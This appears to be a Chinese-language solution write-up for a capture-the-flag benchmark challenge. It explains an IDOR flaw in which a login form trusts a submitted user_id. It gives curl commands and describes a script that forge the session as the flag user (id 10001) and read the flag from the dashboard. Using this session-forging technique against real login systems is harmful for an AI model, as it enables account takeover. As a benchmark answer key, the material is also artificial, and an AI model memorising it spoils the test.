# X-043-24 利用说明（认证阶段 IDOR）

## 原理概述
- 默认账号：`test:test`。
- 认证逻辑缺陷：在 `/password/<username>` 的登录提交中，后端直接信任表单里的 `user_id` 来建立会话，只校验该 ID 是否存在，不校验是否属于当前用户名（IDOR）。
- Flag 存放：应用启动时创建用户 `flag`，其 `id=10001`，`last_name` 字段写入容器 `/flag` 内容。仪表盘 `/dashboard` 会显示 `Welcome, FirstName LastName`，因此切换到 `id=10001` 的会话即可看到 flag。

## 一键脚本（exp.py）
- 路径：`benchmarks/X-043-24/exp.py`
- 依赖：无（标准库 urllib）
- 默认目标：`http://ip32807`
- 用法：
  - 直接运行：`python3 benchmarks/X-043-24/exp.py`
  - 指定目标：`python3 benchmarks/X-043-24/exp.py http://<HOST>:<PORT>`
- 行为：
  1) 先直接对 `/password/test` 提交 `user_id=10001&password=test`；
  2) 若未命中，再读取 `/password/test` 的隐藏 `user_id` 作为基准，模糊尝试相近 ID（±1/2/3/5/10/20/50/100，及 10001/10000/9999/1）；
  3) 访问 `/dashboard` 并提取 `FLAG{...}`。

## 直接命令（无需脚本）
- 将 BASE 替换为你的目标（如下为默认远端）：

```
BASE="http://ip32807"
# 在密码页强行将 user_id 置为 10001
curl -c jar -b jar -sSL -X POST "$BASE/password/test" -d "username=test&user_id=10001&password=test" >/dev/null
# 访问仪表盘并提取 FLAG
curl -c jar -b jar -sS "$BASE/dashboard" | sed -n 's/.*\(FLAG{[^}]*}\).*/\1/p'
```

## 成功标志
- 返回形如：`FLAG{...}`
- 或页面包含 “Welcome, Flag FLAG{...}”。

## 参考源码位置
- 认证 IDOR：`benchmarks/X-043-24/app/website/app/routes.py:58`
- 默认账号：`benchmarks/X-043-24/app/website/app/__init__.py:28-29`
- Flag 用户：`benchmarks/X-043-24/app/website/app/__init__.py:46-49`
- 仪表盘输出：`benchmarks/X-043-24/app/website/app/templates/dashboard.html:24`

